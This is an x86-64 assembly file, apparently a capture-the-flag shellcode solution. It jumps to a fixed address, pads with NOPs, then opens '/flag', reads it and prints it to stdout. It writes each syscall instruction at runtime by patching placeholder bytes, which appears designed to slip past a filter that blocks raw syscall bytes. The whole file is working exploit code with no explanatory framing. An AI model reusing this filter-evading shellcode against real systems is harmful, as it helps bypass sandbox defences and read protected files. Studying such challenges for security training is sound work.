.global _start
.intel_syntax noprefix
_start:
    mov rax, 0x29f4e000
    jmp rax

.rept 0x1000 - (. - _start)
    nop
.endr

    # Open the flag file
    mov rax, 2                    # open syscall
    lea rdi, [rip + flag_path]    # filename
    xor rsi, rsi                  # O_RDONLY = 0
    # Create syscall instruction
    mov byte ptr [rip + sys1], 0x0f
    mov byte ptr [rip + sys1+1], 0x05
sys1:
    .byte 0x0e, 0x04
    
    # Read from opened file
    mov rdi, rax                  # fd from open
    mov rax, 0                    # read syscall  
    mov rsi, 0x29f4e200           # buffer
    mov rdx, 100                  # size
    mov byte ptr [rip + sys2], 0x0f
    mov byte ptr [rip + sys2+1], 0x05
sys2:
    .byte 0x0e, 0x04
    
    # Write to stdout (fd 1)
    mov rax, 1                    # write syscall
    mov rdi, 1                    # stdout
    mov rsi, 0x29f4e200           # buffer
    mov rdx, 100                  # size
    mov byte ptr [rip + sys3], 0x0f
    mov byte ptr [rip + sys3+1], 0x05
sys3:
    .byte 0x0e, 0x04
    
    # Exit
    mov rax, 60                   # exit syscall
    xor rdi, rdi                  # status 0
    mov byte ptr [rip + sys4], 0x0f
    mov byte ptr [rip + sys4+1], 0x05
sys4:
    .byte 0x0e, 0x04

flag_path:
    .string "/flag"
